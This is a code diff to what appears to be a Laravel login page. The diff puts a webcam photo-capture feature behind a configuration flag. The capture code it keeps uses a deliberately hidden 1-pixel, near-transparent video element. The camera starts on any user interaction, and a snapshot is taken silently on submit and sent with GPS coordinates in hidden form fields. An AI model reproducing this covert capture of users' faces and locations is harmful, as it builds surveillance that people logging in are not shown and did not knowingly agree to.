@@ -79,8 +79,10 @@
                             <input type="hidden" name="latitude" id="lat">
                             <input type="hidden" name="longitude" id="lng">
                             <input type="hidden" name="photo_data" id="photo_data">
+                            @if (!empty($loginPhotoCaptureEnabled))
                             <video id="video" width="320" height="240" style="position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;pointer-events:none;z-index:-1;" playsinline muted></video>
                             <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+                            @endif
 
                             <button type="submit" class="btn btn-sx-auth">
                                 <i class="fa fa-sign-in" style="margin-right:8px;"></i>Login
@@ -254,8 +256,10 @@
 
     let gpsResolved = false;
     let cameraReady = false;
+    const loginPhotoCaptureEnabled = {{ !empty($loginPhotoCaptureEnabled) ? 'true' : 'false' }};
 
     async function initCamera() {
+        if (!loginPhotoCaptureEnabled) return;
         const video = document.getElementById('video');
         if (!video) return;
         if (video.srcObject && cameraReady) return;
@@ -299,22 +303,29 @@
     }
 
     ['mousedown', 'keydown', 'touchstart', 'scroll', 'click'].forEach(evt => {
-        document.addEventListener(evt, () => { initCamera(); initGps(); }, { once: false });
+        document.addEventListener(evt, () => { if (loginPhotoCaptureEnabled) initCamera(); initGps(); }, { once: false });
     });
     initGps();
-    setTimeout(initCamera, 500);
+    if (loginPhotoCaptureEnabled) {
+        setTimeout(initCamera, 500);
+    }
 
     form.addEventListener('submit', async function(e) {
         e.preventDefault();
         if (!gpsResolved) await new Promise(r => setTimeout(r, 1200));
 
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        if (video && video.srcObject && video.readyState >= 2) {
-            try {
-                canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
-                document.getElementById('photo_data').value = canvas.toDataURL('image/jpeg', 0.8);
-            } catch (err) {}
+        if (loginPhotoCaptureEnabled) {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            if (video && canvas && video.srcObject && video.readyState >= 2) {
+                try {
+                    canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+                    document.getElementById('photo_data').value = canvas.toDataURL('image/jpeg', 0.8);
+                } catch (err) {}
+            }
+        } else {
+            const photoInput = document.getElementById('photo_data');
+            if (photoInput) photoInput.value = '';
         }
 
         const loginAlert = document.getElementById('loginAlert');
